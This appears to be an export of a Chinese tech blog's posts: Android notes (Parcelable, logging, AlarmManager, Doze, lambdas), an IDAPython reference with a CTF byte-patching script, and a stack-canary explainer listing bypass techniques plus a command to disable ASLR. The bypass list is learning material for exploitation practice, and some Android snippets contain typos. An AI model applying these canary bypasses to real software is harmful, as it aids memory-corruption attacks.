<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="keyword">implements</span> <span class="title">Parcelable</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">describeContents</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">writeToParcel</span><span class="params">(Parcel dest, <span class="keyword">int</span> flags)</span></span>&#123;</span><br><span class="line">        dest.writeString(name);</span><br><span class="line">        dest.writeInt(age);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Parcelable.Creator&lt;Person&gt; CREATOR = <span class="keyword">new</span> Parcelable.Creator&lt;Person&gt;()&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Person <span class="title">createFromParcel</span><span class="params">(Parcel source)</span></span>&#123;</span><br><span class="line">            Person person = <span class="keyword">new</span> Person();</span><br><span class="line">            person.name = source.readString();</span><br><span class="line">            person.age = source.readInt();</span><br><span class="line">            <span class="keyword">return</span> person</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@override</span></span><br><span class="line">        <span class="keyword">public</span> Person[] newArray(<span class="keyword">int</span> size)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> person[size];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>需要注意的write和read的顺序一定要相同。</p>
<p>接下来在FirstActivity中的写法和Serializable相同，而在SecondActivity修改为如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Person person = (Person) getIntent().getParcelableExtra(<span class="string">"person_data"</span>);</span><br></pre></td></tr></table></figure>

<p>通常情况下，Parcelable的效率比Serializable更高一些。</p>
<h2 id="定制日志工具"><a href="#定制日志工具" class="headerlink" title="定制日志工具"></a>定制日志工具</h2><p>新建一个LogUtil类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LogUtil</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> VERBOSE = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> DEBUG = <span class="number">2</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> INFO = <span class="number">3</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> WARN = <span class="number">4</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> ERROR = <span class="number">5</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> NOTHING = <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> in level = VERBOSE;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">v</span><span class="params">(String tag, String msg)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(level &lt;= VERBOSE)&#123;</span><br><span class="line">            Log.v(tag, msg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">d</span><span class="params">(String tag, String msg)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(level &lt;= DEBUG)&#123;</span><br><span class="line">            Log.d(tag, msg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">i</span><span class="params">(String tag, String msg)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(level &lt;= INFO)&#123;</span><br><span class="line">            Log.i(tag, msg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">w</span><span class="params">(String tag, String msg)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(level &lt;= WARN)&#123;</span><br><span class="line">            Log.w(tag, msg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">e</span><span class="params">(String tag, String msg)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(level &lt;= ERROR)&#123;</span><br><span class="line">            Log.e(tag, msg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>比如打印日志DEBUG时时可以这样写：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">LogUtil.d(<span class="string">"TAG"</span>, <span class="string">"debug log"</span>);</span><br></pre></td></tr></table></figure>

<p>这样，当正式发布时只需要将level值修改为NOTHING就不会显示任何日志了。</p>
<h2 id="调试Android程序"><a href="#调试Android程序" class="headerlink" title="调试Android程序"></a>调试Android程序</h2><h2 id="创建定时任务"><a href="#创建定时任务" class="headerlink" title="创建定时任务"></a>创建定时任务</h2><p>Android的定时任务一般有两种实现方式：Java API里提供的Timer类和Android的Alarm机制。而Timer不适用与需要长期在后台运行的定时任务。这是因为Android长时间不操作时CPU会进入睡眠状态，Alarm则具有唤醒CPU的功能。</p>
<h3 id="Alarm机制"><a href="#Alarm机制" class="headerlink" title="Alarm机制"></a>Alarm机制</h3><p>主要是借助AlarmManager类来实现的。</p>
<p>获取一个AlarmManager实例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">AlarmManage manager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);</span><br></pre></td></tr></table></figure>

<p>接下来调用set()方法即可，比如要设置在10秒后执行：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">long</span> triggerAtTime = SystemClock.elapsedRealtime() + <span class="number">10</span> * <span class="number">1000</span>;</span><br><span class="line"></span><br><span class="line">manager.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAtTime, pendingIntent);</span><br></pre></td></tr></table></figure>

<p>set()方法第一个参数是整型参数，用于指定工作类型：ELAPSED_REALTIME（表示让定时任务的触发时间从系统开机开始算起，但不会唤醒CPU）、ELAPSED_REALTIME_WAKEUP（表示让定时任务的触发时间从系统开机开始算起，但会唤醒CPU）、RTC（表示让定时任务的触发时间从1970年1月1日0点开始算起，但不会唤醒CPU）和RTC_WAKEUP（表示让定时任务的触发时间从1970年1月1日0点开始算起，但会唤醒CPU）。第二个参数是定时任务触发时间。第三个参数是PendingIntent，这里一般会调用getService()方法或getBroadcast()方法来获取一个能够执行服务或广播的PendingIntent。</p>
<p>SystemClock.elapsedRealtime()方法用于获取系统开机至今所经历时间的毫秒数。</p>
<p>SystemClock.currentTimeMillis()方法用于获取从1970年1月1日0点至今所经历时间的毫秒数。</p>
<p>另外需要注意的是，从Android4.4系统开始，Alarm任务的触发时间将会变得不准确，因为系统会将触发时间相近的几个任务放在一起执行。</p>
<p>如果必须准确无误的话，使用AlarmManager的setExact()方法替代set()方法即可。</p>
<h3 id="Doze模式"><a href="#Doze模式" class="headerlink" title="Doze模式"></a>Doze模式</h3><p>当用户的设备是Android6.0或以上系统时，如果该设备为插接电源，处于静止状态（Android7.0中删除了这一条件），且屏幕关闭了一段时间后，就会进入Doze模式。在Doze模式下，系统会对CPU、网络、Alarm等活动进行限制，从而延长电池的使用寿命。</p>
<p>当然，系统不会一直处于Doze模式，而是会间歇性的退出Doze模式一小段时间，在这段时间中，应用就可以去完成他们的同步操作、Alarm任务等。</p>
<p><img src="./day8/2.jpg" alt=""></p>
<p>随着设备进入Doze模式的时间越长，间歇性地退出Doze模式的时间间隔也会越长。</p>
<p>Doze模式下功能的限制：</p>
<ul>
<li>网络访问被禁止。</li>
<li>系统忽略唤醒CPU或者屏幕操作。</li>
<li>系统不再执行WIFI扫描。</li>
<li>系统不再执行同步服务。</li>
<li>Alarm任务将会在下次退出Doze模式的时候执行。</li>
</ul>
<p>AlarmManager的setAndAllowWhileIdle()和setExactAndAllowWhileIdle()方法就能让定时任务在Doze模式下也正常执行，这两个方法间的区别和set()、setExact()方法之间的区别是一样的。</p>
<h2 id="多窗口模式编程"><a href="#多窗口模式编程" class="headerlink" title="多窗口模式编程"></a>多窗口模式编程</h2><p>Android7.0系统中引入了多窗口模式，它运行我们在同一个屏幕中同时打开两个应用程序。</p>
<h3 id="多窗口模式下的生命周期"><a href="#多窗口模式下的生命周期" class="headerlink" title="多窗口模式下的生命周期"></a>多窗口模式下的生命周期</h3><p>多窗口模式并不会改变活动原有的生命周期，只是会将用户最近交互过的那个活动设置为运行状态，而多窗口模式下另一个可见的活动设置为暂停状态。</p>
<h2 id="Lambda表达式"><a href="#Lambda表达式" class="headerlink" title="Lambda表达式"></a>Lambda表达式</h2><p>Lambda表达式本质上是一种匿名方法，即没有方法名，也没有访问修饰符和返回类型。</p>
<p>首先需要在app/build.gradle中添加如下配置：</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">android &#123;</span><br><span class="line">	...</span><br><span class="line">    defaultConfig &#123;</span><br><span class="line">        ...</span><br><span class="line">        jackOptions.enabled = <span class="keyword">true</span></span><br><span class="line">    &#125;</span><br><span class="line">	complieOptions&#123;</span><br><span class="line">	<span class="keyword">sourceCompatibility</span> JavaVersion.VERSION_1_8</span><br><span class="line">	<span class="keyword">targetCompatibility</span> JavaVersion.VERSION_1_8</span><br><span class="line">	&#125;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>之后就可以使用Lambda表达式了，比如开启子线程可以写成：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">    <span class="comment">//pass</span></span><br><span class="line">&#125;).start();</span><br></pre></td></tr></table></figure>

<p>凡是只有一个待实现方法的接口，都可以使用Lambda表达式的写法。</p>
<p>另外一种对于含参数的：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">MyListener</span></span>&#123;</span><br><span class="line">	<span class="function">String <span class="title">doSomething</span><span class="params">(String a, <span class="keyword">int</span> b)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对于这一的，Lambda表达可以这样写：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">MyListener listener = (String a, <span class="keyword">int</span> b) -&gt;&#123;</span><br><span class="line">	String result = a + b;</span><br><span class="line">	<span class="keyword">return</span> result;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>另外Java还可以根据上下文自动推断出Lambda表达式中的参数类型：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">MyListener listener = (a, b) -&gt; &#123;</span><br><span class="line">	String result = a + b;</span><br><span class="line">	<span class="keyword">return</span> result;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>接下来再举个例子，比如现在有一个方法是接收Mylistener参数的：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">hello</span><span class="params">(MyListener listener)</span> </span>&#123;</span><br><span class="line">    String a = <span class="string">"Hello Lambda"</span>;</span><br><span class="line">    <span class="keyword">int</span> b = <span class="number">1024</span>;</span><br><span class="line">    String result = listener.doSomething(a, b);</span><br><span class="line">    Log.d(<span class="string">"TAG"</span>, result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那么在调用hello()这个方法的时候可以这样写：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">hello((a, b) -&gt; &#123;</span><br><span class="line">    String result = a + b;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>跟着Lantern学逆向之IDA python</title>
    <url>/2020/05/18/RE/%E8%B7%9F%E7%9D%80Lantern%E5%AD%A6RE%E4%B9%8BIDA%20python/</url>
    <content><![CDATA[<p>跟着<a href="https://lantern.cool/2020/05/05/ida-python/" target="_blank" rel="noopener">Lantern</a>学逆向之IDA python:</p>
<h1 id="函数表"><a href="#函数表" class="headerlink" title="函数表"></a>函数表</h1><p>首先是介绍一些函数：</p>
<table>
<thead>
<tr>
<th>函数名</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>ScreenEA()</td>
<td>获取 IDA 调试窗口中，光标指向代码的地址。</td>
</tr>
<tr>
<td>GetInputFileMD5()</td>
<td>返回 IDA 加载的二进制文件的 MD5 值。</td>
</tr>
<tr>
<td>FirstSeg()</td>
<td>访问程序中的第一个段。</td>
</tr>
<tr>
<td>NextSeg()</td>
<td>访问下一个段，如果没有就返回 BADADDR。</td>
</tr>
<tr>
<td>SegByName( string SegmentName )</td>
<td>通过段名字返回段基址，举个例子，如果调用.text 作为参数，就会返回程序中代码段的开始位置。</td>
</tr>
<tr>
<td>SegEnd( long Address )</td>
<td>通过段内的某个地址，获得段尾的地址。</td>
</tr>
<tr>
<td>SegStart( long Address )</td>
<td>通过段内的某个地址，获得段头的地址。</td>
</tr>
<tr>
<td>SegName( long Address )</td>
<td>通过段内的某个地址，获得段名。</td>
</tr>
<tr>
<td>Segments()</td>
<td>返回目标程序中的所有段的开始地址。</td>
</tr>
<tr>
<td>Functions( long StartAddress, long EndAddress )</td>
<td>返回一个列表，包含了从 StartAddress 到 EndAddress 之间的所有函数。</td>
</tr>
<tr>
<td>Chunks( long FunctionAddress )</td>
<td>返回一个列表，包含了函数片段。每个列表项都是一个元组（chunk start, chunk end）</td>
</tr>
<tr>
<td>LocByName( string FunctionName )</td>
<td>通过函数名返回函数的地址。</td>
</tr>
<tr>
<td>GetFuncOffset( long Address )</td>
<td>通过任意一个地址，然后得到这个地址所属的函数名，以及给定地址和函数的相对位移。 然后把这些信息组成字符串以”名字+位移”的形式返回。</td>
</tr>
<tr>
<td>GetFunctionName( long Address )</td>
<td>通过一个地址，返回这个地址所属的函数。</td>
</tr>
<tr>
<td>CodeRefsTo( long Address, bool Flow )</td>
<td>返回一个列表，告诉我们 Address 处代码被什么地方引用了，Flow 告诉 IDAPython 是否要 跟踪这些代码。</td>
</tr>
<tr>
<td>CodeRefsFrom( long Address, bool Flow )</td>
<td>返回一个列表，告诉我们 Address 地址上的代码引用何处的代码。</td>
</tr>
<tr>
<td>DataRefsTo( long Address )</td>
<td>返回一个列表，告诉我们 Address 处数据被什么地方引用了。常用于跟踪全局变量。</td>
</tr>
<tr>
<td>DataRefsFrom( long Address )</td>
<td>返回一个列表，告诉我们 Address 地址上的代码引用何处的数据。</td>
</tr>
<tr>
<td>Heads(start=None, end=None)</td>
<td>得到两个地址之间所有的元素</td>
</tr>
<tr>
<td>GetDisasm(addr)</td>
<td>得到addr的反汇编语句</td>
</tr>
<tr>
<td>GetMnem(addr)</td>
<td>得到addr地址的操作码</td>
</tr>
<tr>
<td>BADADDR</td>
<td>验证是不是错误地址</td>
</tr>
<tr>
<td>GetOpnd(addr，long n)</td>
<td>第一个参数是地址，第二个long n是操作数索引。第一个操作数是0和第二个是1。</td>
</tr>
<tr>
<td>idaapi.decode_insn(ea)</td>
<td>得到当前地址指令的长度</td>
</tr>
<tr>
<td>idc.FindFuncEnd(ea)</td>
<td>找到当前地址的函数结束地址</td>
</tr>
<tr>
<td>Entries()</td>
<td>入口点信息</td>
</tr>
<tr>
<td>Structs()</td>
<td>遍历结构体</td>
</tr>
<tr>
<td>StructMembers(sid)</td>
<td>遍历结构体成员</td>
</tr>
<tr>
<td>DecodePrecedingInstruction(ea)</td>
<td>获取指令结构</td>
</tr>
<tr>
<td>DecodePreviousInstruction(ea)</td>
<td>获取指令结构</td>
</tr>
<tr>
<td>DecodeInstruction(ea)</td>
<td>获取指令结构</td>
</tr>
<tr>
<td>Strings(object)</td>
<td>获取字符串</td>
</tr>
<tr>
<td>GetIdbDir()</td>
<td>获取idb目录</td>
</tr>
<tr>
<td>GetRegisterList()</td>
<td>获取寄存器名表</td>
</tr>
<tr>
<td>GetInstructionList</td>
<td>获取汇编指令表</td>
</tr>
<tr>
<td>atoa(ea)</td>
<td>获取所在段</td>
</tr>
<tr>
<td>Jump(ea)</td>
<td>移动光标</td>
</tr>
<tr>
<td>Eval(expr)</td>
<td>计算表达式</td>
</tr>
<tr>
<td>Exec(command)</td>
<td>执行命令行</td>
</tr>
<tr>
<td>MakeCode(ea)</td>
<td>分析代码区</td>
</tr>
<tr>
<td>MakeNameEx(ea, name, flags)</td>
<td>重命名地址</td>
</tr>
<tr>
<td>MakeArray(ea, nitems)</td>
<td>创建数组</td>
</tr>
<tr>
<td>MakeStr(ea, endea)</td>
<td>创建字符串</td>
</tr>
<tr>
<td>MakeData(ea, flags, size, tid)</td>
<td>创建数据</td>
</tr>
<tr>
<td>MakeByte(ea)</td>
<td></td>
</tr>
<tr>
<td>MakeWord(ea)</td>
<td></td>
</tr>
<tr>
<td>MakeDWord(ea)</td>
<td></td>
</tr>
<tr>
<td>MakeQWord(ea)</td>
<td></td>
</tr>
<tr>
<td>MakeOWord(ea)</td>
<td></td>
</tr>
<tr>
<td>MakeYWord(ea)</td>
<td></td>
</tr>
<tr>
<td>MakeFlot(ea)</td>
<td></td>
</tr>
<tr>
<td>MakeDouble(ea)</td>
<td></td>
</tr>
<tr>
<td>MakePackReal(ea)</td>
<td></td>
</tr>
<tr>
<td>MakeTbyte(ea)</td>
<td></td>
</tr>
<tr>
<td>MakeStructEx(ea)</td>
<td></td>
</tr>
<tr>
<td>MakeCustomDataEx(ea)</td>
<td></td>
</tr>
<tr>
<td>PatchByte(ea, value)</td>
<td>修改程序字节</td>
</tr>
<tr>
<td>PatchWord(ea, value)</td>
<td>修改程序字</td>
</tr>
<tr>
<td>PatchDword(ea, value)</td>
<td>修改程序双字</td>
</tr>
<tr>
<td>Byte(ea)</td>
<td>将地址解释为Byte</td>
</tr>
<tr>
<td>Word(ea)</td>
<td></td>
</tr>
<tr>
<td>DWord(ea)</td>
<td></td>
</tr>
<tr>
<td>QWord(ea)</td>
<td></td>
</tr>
<tr>
<td>GetFloat(ea)</td>
<td>获取浮点数</td>
</tr>
<tr>
<td>GetDouble(ea)</td>
<td>获取双精度浮点数</td>
</tr>
<tr>
<td>GetString(ea, length = -1, strtype = ASCSTR_C)</td>
<td>获取字符串</td>
</tr>
<tr>
<td>GetCurrentLine()</td>
<td>获取光标所在行反汇编</td>
</tr>
<tr>
<td>ItemSize(ea)</td>
<td>获取指令或数据长度</td>
</tr>
<tr>
<td>FindText(ea, flag, y, x, searchstr)</td>
<td>查找文本</td>
</tr>
<tr>
<td>FindBinary(ea, flag, searchstr, radix=16)</td>
<td>查找16进制</td>
</tr>
<tr>
<td>GetEntryPointQty()</td>
<td>获取入口点个数</td>
</tr>
<tr>
<td>GetEntryOrdinal(index)</td>
<td>获取入口点地址</td>
</tr>
<tr>
<td>GetEntryName(ordinal)</td>
<td>获得入口名</td>
</tr>
</tbody></table>
<h1 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h1><h3 id="xman2019-trydbg-exe"><a href="#xman2019-trydbg-exe" class="headerlink" title="xman2019-trydbg.exe"></a>xman2019-trydbg.exe</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">	addr = find_binary(<span class="number">0x140001050</span>, <span class="number">1</span>, <span class="string">'74 12 75 10 4C 7F 53 0C 0C 54 8F C4 28 E9 42 FE FF FF 80 75'</span>)</span><br><span class="line">	<span class="string">'''</span></span><br><span class="line"><span class="string">	     ea - address to start from</span></span><br><span class="line"><span class="string">	     str - a string as a user enters it for Search Text in Core</span></span><br><span class="line"><span class="string">	'''</span></span><br><span class="line">	<span class="keyword">if</span> addr == BADADDR:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">		PatchByte(addr+i, <span class="number">0x90</span>)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>RE</category>
      </categories>
      <tags>
        <tag>RE</tag>
        <tag>tool</tag>
        <tag>python</tag>
        <tag>ida</tag>
      </tags>
  </entry>
  <entry>
    <title>堆栈保护技术详解</title>
    <url>/2020/05/22/pwn/canary%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<h2 id="什么是堆栈保护技术？"><a href="#什么是堆栈保护技术？" class="headerlink" title="什么是堆栈保护技术？"></a>什么是堆栈保护技术？</h2><p>堆栈保护技术（即Stack canary）是用于防护栈溢出攻击的一种保护机制：在栈上的返回地址跟ebp之前加上一个标志位canary，返回时通过验证这个canary是否被改写，从而判断程序是否被栈溢出攻击。</p>
<h2 id="如何开启堆栈保护技术？"><a href="#如何开启堆栈保护技术？" class="headerlink" title="如何开启堆栈保护技术？"></a>如何开启堆栈保护技术？</h2><p>用gcc编译时，可以用以下参数来设置：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">-fstack-protector 启用保护，不过只为局部变量中含有数组的函数插入保护</span><br><span class="line">-fstack-protector-all 启用保护，为所有函数插入保护</span><br><span class="line">-fstack-protector-strong</span><br><span class="line">-fstack-protector-<span class="keyword">explicit</span> 只对有明确 stack_protect attribute 的函数开启保护</span><br><span class="line">-fno-<span class="built_in">stack</span>-protector 禁用保护</span><br></pre></td></tr></table></figure>

<h2 id="canary的产生"><a href="#canary的产生" class="headerlink" title="canary的产生"></a>canary的产生</h2><p>在开启了堆栈保护技术程序中，我们再ida经常可以看到用如下的指令来获取canary：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov     rax, fs:28h</span><br></pre></td></tr></table></figure>

<p>其中，fs其实是指向当前栈的TLS结构：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">void</span> *tcb;        <span class="comment">/* Pointer to the TCB.  Not necessarily the</span></span><br><span class="line"><span class="comment">                       thread descriptor used by libpthread.  */</span></span><br><span class="line">  <span class="keyword">dtv_t</span> *dtv;</span><br><span class="line">  <span class="keyword">void</span> *self;       <span class="comment">/* Pointer to the thread descriptor.  */</span></span><br><span class="line">  <span class="keyword">int</span> multiple_threads;</span><br><span class="line">  <span class="keyword">uintptr_t</span> sysinfo;</span><br><span class="line">  <span class="keyword">uintptr_t</span> stack_guard;</span><br><span class="line">  ...</span><br><span class="line">&#125; <span class="keyword">tcbhead_t</span>;</span><br></pre></td></tr></table></figure>

<p>fs+0x28h即为stack_guard。</p>
<p>而TLS结构是由security_init()初始化：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">security_init</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// _dl_random的值在进入这个函数的时候就已经由kernel写入.</span></span><br><span class="line">  <span class="comment">// glibc直接使用了_dl_random的值并没有给赋值</span></span><br><span class="line">  <span class="comment">// 如果不采用这种模式, glibc也可以自己产生随机数</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//将_dl_random的最后一个字节设置为0x0</span></span><br><span class="line">  <span class="keyword">uintptr_t</span> stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 设置Canary的值到TLS中</span></span><br><span class="line">  THREAD_SET_STACK_GUARD (stack_chk_guard);</span><br><span class="line"></span><br><span class="line">  _dl_random = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> THREAD_SET_STACK_GUARD(value) \</span></span><br><span class="line">  THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)</span><br></pre></td></tr></table></figure>

<p>security_init()是ld文件中的一个子函数，在ida中可以看到，初始化canary为如下指令（以2.23版本为例）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:0000000000003C25                 mov     rdx, cs:qword_225E68</span><br><span class="line">.text:0000000000003C2C                 mov     rax, [rdx]</span><br><span class="line">.text:0000000000003C2F                 xor     al, al</span><br><span class="line">.text:0000000000003C31                 mov     fs:28h, rax</span><br><span class="line">.text:0000000000003C3A                 mov     rax, [rdx+8]</span><br><span class="line">.text:0000000000003C3E                 mov     fs:30h, rax</span><br><span class="line">.text:0000000000003C47                 mov     cs:qword_225E68, 0</span><br><span class="line">.text:0000000000003C52                 mov     cs:qword_225C70, rax</span><br></pre></td></tr></table></figure>

<p>其中，cs:qword_225E68即对应对应于存放_dl_random的地址。</p>
<p>（注：fs寄存器的内容可以通过在gdb中直接输入fsbase得到。）</p>
<p>而_dl_random的地址来自：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:0000000000019741                 cmp     [rsp+78h+var_49], 0</span><br><span class="line">.text:0000000000019746                 jz      loc_1983C</span><br><span class="line">.text:000000000001974C                 mov     rax, [rsp+20h]</span><br><span class="line">.text:0000000000019751                 mov     cs:qword_225E68, rax</span><br></pre></td></tr></table></figure>

<p>这里下个内存断点来跟进（直接关闭aslr）：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; watch *(0x7fffffffde80+0x20)</span><br><span class="line">Hardware watchpoint 5: *(0x7fffffffde80+0x20)</span><br></pre></td></tr></table></figure>

<p>结果跟进到 <code>► 0x7ffff7df0786 &lt;_dl_sysdep_start+518&gt;    jmp    _dl_sysdep_start+304 &lt;0x7ffff7df06b0&gt;</code>里面来，在ida下看看：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:0000000000019778 loc_19778:</span><br><span class="line">.text:0000000000019778                 mov     rax, [rdx+8] </span><br><span class="line">.text:000000000001977C                 mov     [rsp+78h+var_49], 1</span><br><span class="line">.text:0000000000019781                 mov     [rsp+20h], rax</span><br><span class="line">.text:0000000000019786                 jmp     loc_196B0</span><br></pre></td></tr></table></figure>

<p>可以看到rsp+0x20的值来自[rdx+8]。分析整个函数，可以得知rdx的值是来自于<code>_dl_sysdep_start</code>函数的第一个参数（有一定的偏移，其值为0x7fffffffdf70，而<code>_dl_random</code>的值为0x7fffffffe2c9）。</p>
<p>继续追溯可以找到也是_dl_start来自的第一个参数（同样是0x7fffffffdf70）。</p>
<p>最终追溯到ld中start函数的rsp：0x7fffffffdf70。</p>
<h2 id="绕过堆栈保护方法"><a href="#绕过堆栈保护方法" class="headerlink" title="绕过堆栈保护方法"></a>绕过堆栈保护方法</h2><p>canary绕过方式总结下有这几种：</p>
<ol>
<li>直接通过相邻的变量puts或者printf，然后leak出来</li>
<li>逐位爆破</li>
<li>通过覆盖TLS结构（地址可以通过与libc的偏移计算得出）中的canary，从而绕过canary保护</li>
<li>劫持___stack_chk_fail的got表项</li>
<li>劫持栈上<code>*** stack smashing detected ***: ./canary terminated</code>中对应<code>./canary</code>处的指针，在发生smashing detected时泄漏出关键信息</li>
</ol>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>gcc</tag>
        <tag>stack</tag>
        <tag>protect</tag>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>canary</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn中各种利用技巧1</title>
    <url>/2020/05/09/pwn/pwn%E4%B8%AD%E5%90%84%E7%A7%8D%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A71/</url>
    <content><![CDATA[<h1 id="关闭aslr"><a href="#关闭aslr" class="headerlink" title="关闭aslr"></a>关闭aslr</h1><p>sudo sysctl -w kernel.randomize_va_space=0</p>
